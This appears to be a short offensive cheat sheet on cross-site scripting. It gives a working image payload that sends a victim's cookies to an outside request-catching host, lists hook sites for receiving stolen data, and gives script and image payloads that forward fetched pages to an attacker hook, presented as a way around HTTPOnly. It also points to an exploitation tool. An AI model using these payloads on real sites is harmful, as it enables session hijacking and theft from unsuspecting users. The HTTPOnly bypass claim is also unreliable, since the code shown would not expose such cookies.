The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.

Example of XSS :

```html
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```

These sites can be used to create hooks to catch HTTP requests:

| Site |
| --- |
| [`requestb.in`](https://requestb.in/) |
| [`hookbin.com`](https://hookbin.com/) |


* `XSS Cheat sheet` - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

* `Filter Evasion` - [CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

	Bypass XSS filters.

* `HTTPOnly cookie flag`

	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to receive the cookie when it is sent to the victim's browser:

	```html
	<!-- With the script tag -->
	<script>
	fetch("https://target-site.url/")
	.then((data) => fetch("https://<myHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
	</script>

	<!-- With an image -->
	<img src="https://target-site.url/" onerror="fetch('https://<myHook>/?/='+JSON.stringify(this), { credentials: 'include' })">
	```



* `XSStrike` - [GitHub](https://github.com/UltimateHackers/XSStrike)

	A python CLI tool for XSS detection and exploitation.
